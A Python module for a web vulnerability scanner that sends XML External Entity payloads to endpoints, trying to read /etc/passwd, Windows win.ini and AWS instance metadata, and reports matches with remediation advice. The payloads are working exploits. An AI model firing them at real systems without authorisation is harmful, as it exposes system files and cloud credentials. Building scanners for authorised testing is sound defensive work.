from __future__ import annotations
import re
import httpx
from core.models import Finding, Endpoint
from scanners.base_scanner import BaseScanner

XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root><data>&xxe;</data></root>'),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root><data>&xxe;</data></root>'),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
     '<root><data>&xxe;</data></root>'),
]

LINUX_PASSWD = re.compile(r"root:.*:0:0:", re.S)
WIN_INI = re.compile(r"\[extensions\]", re.I)
AWS_META = re.compile(r"ami-id|instance-type|security-credentials", re.I)


class XXEScanner(BaseScanner):
    name = "xxe"
    finding_type = "XML External Entity Injection (XXE)"
    severity = "Critical"

    def is_applicable(self, target) -> bool:
        if isinstance(target, Endpoint):
            ct = target.content_type.lower()
            return "xml" in ct or target.method == "POST"
        return False

    async def scan(self, target: Endpoint) -> list[Finding]:
        findings = []

        for payload in XXE_PAYLOADS:
            for ct in ["application/xml", "text/xml"]:
                try:
                    r = await self.session.request(
                        method=target.method,
                        url=target.url,
                        content=payload.encode(),
                        headers={
                            "Content-Type": ct,
                            "Accept": "application/xml, text/xml, */*",
                        },
                        timeout=12
                    )
                    body = r.text

                    evidence = None
                    desc = None
                    if LINUX_PASSWD.search(body):
                        evidence = body[:300]
                        desc = "XXE successful — /etc/passwd content returned in response!"
                    elif WIN_INI.search(body):
                        evidence = body[:300]
                        desc = "XXE successful — Windows win.ini content returned!"
                    elif AWS_META.search(body):
                        evidence = body[:300]
                        desc = "XXE with SSRF — AWS metadata accessible via XXE!"

                    if evidence:
                        findings.append(self.make_finding(
                            url=target.url,
                            payload=payload[:100],
                            evidence=evidence,
                            description=desc,
                            remediation="Disable external entity processing in your XML parser. "
                                        "Use a safe XML library configuration (e.g., defusedxml in Python).",
                        ))
                        return findings  # One confirmed finding is enough

                except Exception:
                    continue

        return findings
